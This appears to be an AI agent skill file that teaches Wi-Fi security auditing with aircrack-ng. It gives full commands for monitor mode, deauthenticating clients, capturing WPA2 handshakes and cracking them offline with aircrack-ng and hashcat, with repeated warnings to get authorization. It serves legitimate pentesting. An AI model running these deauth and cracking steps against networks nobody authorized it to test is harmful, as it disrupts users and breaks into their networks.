---
name: aircrack-ng
description: >-
  Audit Wi-Fi networks with the aircrack-ng suite. Use when a user asks to
  test their own wireless network, capture WPA2 handshakes, crack captured
  handshakes offline, put an adapter into monitor mode, or perform a
  wireless pentest under an authorized engagement.
license: Apache-2.0
compatibility: 'Linux, aircrack-ng 1.7+, monitor-mode-capable Wi-Fi adapter'
metadata:
  author: terminal-skills
  version: 1.0.0
  category: devops
  tags:
    - aircrack-ng
    - wireless-security
    - wpa2
    - penetration-testing
    - wifi
---

# Aircrack-ng

## Overview

Aircrack-ng is the reference suite for 802.11 security auditing. It captures wireless frames in monitor mode, extracts WPA/WPA2 4-way handshakes, and performs offline dictionary attacks against the captured handshake. The suite is `airmon-ng` (monitor mode), `airodump-ng` (capture), `aireplay-ng` (injection/deauth), and `aircrack-ng` (offline crack). Use exclusively on networks you own or have written permission to audit.

## Instructions

### Step 1: Put the Adapter in Monitor Mode

```bash
# Check which adapters support monitor mode and injection
sudo airmon-ng
# PHY     Interface       Driver          Chipset
# phy0    wlan0           ath9k_htc       Atheros AR9271

# Kill processes that interfere with monitor mode
sudo airmon-ng check kill

# Enable monitor mode — wlan0 becomes wlan0mon
sudo airmon-ng start wlan0

# Verify
iw dev wlan0mon info | grep type
# type monitor
```

### Step 2: Scan Nearby Networks

```bash
# Scan all 2.4 and 5 GHz channels
sudo airodump-ng wlan0mon
# Columns: BSSID, PWR, Beacons, #Data, CH, ENC, CIPHER, AUTH, ESSID
# Note the BSSID and channel of your target network

# Filter to a specific channel and BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
# -w handshake: write pcap files prefixed "handshake"
# Keep this running — it logs clients connecting to the AP
```

### Step 3: Capture a WPA Handshake

```bash
# Option A: passive — wait for a client to authenticate
# airodump shows "WPA handshake: AA:BB:CC:DD:EE:FF" in the top-right when captured

# Option B: active — deauth an existing client to force reconnection
# (only on networks you own or have authorization for)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -a: AP BSSID   -c: client MAC (from airodump station list)
# 5 deauth packets is usually enough; don't flood.

# Confirm the handshake is in the capture
aircrack-ng handshake-01.cap
# Look for: "1 handshake" next to the target BSSID
```

### Step 4: Crack the Handshake Offline

```bash
# Dictionary attack with rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
# KEY FOUND! [ correcthorsebattery ]

# With a rule-transformed wordlist (via john)
john --wordlist=rockyou.txt --rules=KoreLogic --stdout \
  | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Convert to hashcat format for GPU cracking (much faster)
hcxpcapngtool -o hash.hc22000 handshake-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### Step 5: Clean Up

```bash
# Stop monitor mode and restore managed mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
iw dev
# Should show wlan0 back in managed mode
```

## Examples

### Example 1: Audit Your Own Home Network

```bash
# Authorization: it's your network. Still, snapshot settings so you can recover.

sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Locate your AP
sudo airodump-ng wlan0mon
# Press Ctrl+C after you see your SSID on, say, channel 6, BSSID CC:... 

# Capture targeted
mkdir -p ~/audit && cd ~/audit
sudo airodump-ng -c 6 --bssid CC:CC:CC:CC:CC:CC -w home wlan0mon &

# Reconnect a device (phone Wi-Fi off/on) to produce the handshake naturally
# Stop airodump once you see "WPA handshake" in the header

# Attempt to crack with a personal wordlist + rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b CC:CC:CC:CC:CC:CC home-01.cap

# If it cracks quickly → your passphrase is weak, change it.
sudo airmon-ng stop wlan0mon
```

### Example 2: GPU-Accelerated Cracking with Hashcat

```bash
# Convert the capture to hashcat 22000 format (replaces older -m 2500)
sudo apt install hcxtools
hcxpcapngtool -o corporate.hc22000 corporate-01.cap

# Verify the essid/mac
cat corporate.hc22000 | head

# Run hashcat with a strong wordlist + best64 rules
hashcat -m 22000 corporate.hc22000 \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --status --status-timer=10

# Retrieve the recovered passphrase
hashcat -m 22000 corporate.hc22000 --show
```

## Guidelines

- **Written authorization is mandatory.** Capturing or cracking a neighbor's Wi-Fi is a crime. Only audit your own networks or those covered by an engagement scope.
- Not every adapter supports monitor mode and injection. Proven chipsets: Atheros AR9271, Ralink RT3070, MediaTek MT7612U, Realtek RTL8812AU.
- Start with `airmon-ng check kill`. NetworkManager will otherwise fight you for control of the interface.
- Deauth attacks are noisy and disruptive — use the minimum count (`--deauth 3-5`) and target a single client, never the broadcast address.
- Only the WPA 4-way handshake is required for offline cracking; longer captures waste disk space.
- For modern networks, convert the capture to `.hc22000` and crack on a GPU with hashcat — CPU aircrack-ng is an order of magnitude slower.
- WPA3 SAE is not vulnerable to the classic offline handshake attack; aircrack-ng is for WPA/WPA2-PSK.
- Tear down monitor mode after the engagement so the host doesn't leak frames in routine use.
